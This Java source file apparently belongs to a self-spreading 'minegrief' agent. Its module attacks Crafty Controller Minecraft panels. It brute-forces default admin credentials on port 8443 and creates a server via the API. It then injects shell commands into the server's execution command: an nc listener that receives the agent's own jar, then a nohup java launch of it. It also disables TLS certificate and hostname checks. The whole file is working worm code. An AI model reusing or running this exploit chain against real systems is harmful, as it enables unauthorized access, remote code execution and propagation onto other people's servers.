package com.chebuya.minegriefagent.modules;

import javax.net.ssl.*;
import java.io.*;
import java.net.Socket;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.*;

import static com.chebuya.minegriefagent.util.Logging.LOGGER;
import static com.chebuya.minegriefagent.util.Network.isPortOpen;

public class Crafty {


    private static final int[] CRAFTY_PORTS = {8443};
    private static final String[] USERNAMES = {"admin"};
    private static final String[] PASSWORDS = {"admin", "crafty", "password"};

    public static boolean attackCrafty(String target) {
        for ( int port : CRAFTY_PORTS) {
            if (!isPortOpen(target, port)) {
                continue;
            }

            LOGGER.info("discovered an open web port on " + target + ":" + port);

            String[] creds = bruteCrafty(target, port);
            if (creds.length == 0) {
                continue;
            }

            LOGGER.info("found valid crafty creds for " + target + ":" + port + ": " + creds[0] + ":" + creds[1]);
            return true;
        }

        return false;
    }

    private static String[] bruteCrafty(String target, int port) {
        for ( String username : USERNAMES ) {
            if (loginCrafty(target, port, username, username)) {
                return new String[] {username, username};
            }

            for ( String password : PASSWORDS ){
                LOGGER.info("attempting " + username + ":" + password + " against " + target);
                if (loginCrafty(target, port, username, password)) {
                    return new String[] {username, password};
                }
            }

        }

        return new String[] {};
    }

    private static boolean loginCrafty(String target, int port, String username, String password) {

        String baseUrl = "https://" + target + ":" + port;

        TrustManager[] trustAllCerts = new TrustManager[] {
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { return null; }
                    public void checkClientTrusted(X509Certificate[] certs, String authType) { }
                    public void checkServerTrusted(X509Certificate[] certs, String authType) { }
                }
        };

        SSLContext sc;
        try {
            sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        } catch (Exception e) {
            LOGGER.warning("could not configure ssl: " + e.getMessage());
        }

        HostnameVerifier allHostsValid = new HostnameVerifier() {
            public boolean verify(String hostname, SSLSession session) { return true; }
        };
        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

        HttpsURLConnection httpConn = null;
        try {
            URL url = new URL(baseUrl + "/login");
            httpConn = (HttpsURLConnection) url.openConnection();
            httpConn.setRequestMethod("POST");

            httpConn.setRequestProperty("Content-Type", "application/json");
            httpConn.setRequestProperty("X-XSRFToken", "2|841f7cd2|d53d9e0bdea5c0307b1c675de1b4a419|1733491583");
            httpConn.setRequestProperty("Cookie", "_xsrf=2|450ca94c|142e4b951fb615aeba0fb2c320a77187|1733491583");

            httpConn.setDoOutput(true);
            OutputStreamWriter writer = new OutputStreamWriter(httpConn.getOutputStream());
            writer.write("{\"username\":\"" + username + "\",\"password\":\"" + password + "\"}");
            writer.flush();
            writer.close();
            httpConn.getOutputStream().close();

            int responseCode = httpConn.getResponseCode();
            if (responseCode != 200) {
                return false;
            }

            Map<String, List<String>> headers = httpConn.getHeaderFields();

            List<String> cookies = headers.get("Set-Cookie");
            String cookie = cookies.get(0).split("token=")[1].split(";")[0];

            url = new URL(baseUrl + "/api/v2/servers");
            httpConn = (HttpsURLConnection) url.openConnection();
            httpConn.setRequestMethod("POST");

            httpConn.setRequestProperty("X-XSRFToken", "2|450ca94c|142e4b951fb615aeba0fb2c320a77187|1733491584");
            httpConn.setRequestProperty("Cookie", "_xsrf=2|450ca94c|142e4b951fb615aeba0fb2c320a77187|1733491584; token=" + cookie);
            httpConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            httpConn.setDoOutput(true);
            writer = new OutputStreamWriter(httpConn.getOutputStream());
            writer.write("{\"name\":\"minegrief\",\"roles\":[],\"monitoring_type\":\"minecraft_java\",\"minecraft_java_monitoring_data\":{\"host\":\"127.0.0.1\",\"port\":25565},\"create_type\":\"minecraft_java\",\"minecraft_java_create_data\":{\"create_type\":\"download_jar\",\"download_jar_create_data\":{\"category\":\"mc_java_servers\",\"type\":\"vanilla\",\"version\":\"1.21.4\",\"mem_min\":1,\"mem_max\":2,\"server_properties_port\":25565}}}");
            writer.flush();
            writer.close();
            httpConn.getOutputStream().close();

            responseCode = httpConn.getResponseCode();
            if (responseCode != 201) {
                return false;
            }

            BufferedReader reader = new BufferedReader(new InputStreamReader(httpConn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            String responseBody = response.toString();

            String uuid = responseBody.split("\"")[9];


            url = new URL(baseUrl + "/api/v2/servers/" + uuid + "/action/eula/");
            httpConn = (HttpsURLConnection) url.openConnection();
            httpConn.setRequestMethod("POST");

            httpConn.setRequestProperty("token", "2|450ca94c|142e4b951fb615aeba0fb2c320a77187|1733491584");
            httpConn.setRequestProperty("Cookie", "_xsrf=2|450ca94c|142e4b951fb615aeba0fb2c320a77187|1733491584; token=" + cookie);

            responseCode = httpConn.getResponseCode();
            if (responseCode != 200) {
                return false;
            }
            Thread.sleep(6000);

            String command = "bash -c \\\"nc -nvlp 1338 > /tmp/minegrief.jar\\\"";
            if (!executeCommand(command, baseUrl, uuid, cookie)) {
                return false;
            }

            Thread.sleep(5000);
            byte[] jarFile = Files.readAllBytes(Paths.get(System.getProperty("sun.java.command")));

            Socket socket = new Socket(target, 1338);
            OutputStream out = socket.getOutputStream();
            out.write(jarFile);
            out.flush();
            if (out != null) {
                out.close();
            }
            if (socket != null) {
                socket.close();
            }

            Thread.sleep(5000);

            command = "bash -c \\\"nohup java -jar /tmp/minegrief.jar &\\\"";
            if (!executeCommand(command, baseUrl, uuid, cookie)) {
                return false;
            }

            return true;
        } catch (Exception e) {
            LOGGER.warning("error while exploiting crafty server: " + e.getMessage());
        }
        return false;
    }

    private static boolean executeCommand(String command, String baseUrl, String uuid, String cookie) throws Exception {
        String curlCmd = "curl -k '" + baseUrl + "/api/v2/servers/" + uuid + "' -X PATCH -H 'X-XSRFToken: 3|450ca94c|142e4b951fb615aeba0fb2c320a77187|1733491584' -H 'Cookie: _xsrf=2|450ca94c|142e4b951fb615aeba0fb2c320a77187|1733491584; token=" + cookie + "' --data-raw '{\"execution_command\":\"" + command + "\"}'";
        // no PATCH method.  Modern problems require modern solutions!
        Process process = Runtime.getRuntime().exec(new String[] {"bash", "-c", curlCmd});

        StringBuilder output = new StringBuilder();

        BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"));
        String line = "";
        while ((line = stdoutReader.readLine()) != null) {
            output.append(line).append(System.getProperty("line.separator"));
        }

        BufferedReader stderrReader = new BufferedReader(new InputStreamReader(process.getErrorStream(), "UTF-8"));
        while ((line = stderrReader.readLine()) != null) {
            output.append(line).append(System.getProperty("line.separator"));
        }

        process.waitFor();

        Thread.sleep(5000);

        URL url = new URL(baseUrl + "/api/v2/servers/" + uuid + "/action/start_server");
        HttpsURLConnection httpConn = (HttpsURLConnection) url.openConnection();
        httpConn.setRequestMethod("POST");

        httpConn.setRequestProperty("token", "2|450ca94c|142e4b951fb615aeba0fb2c320a77187|1733491584");
        httpConn.setRequestProperty("Cookie", "_xsrf=2|450ca94c|142e4b951fb615aeba0fb2c320a77187|1733491584; token=" + cookie);


        int responseCode = httpConn.getResponseCode();
        if (responseCode != 200) {
            return false;
        }

        return true;
    }
}
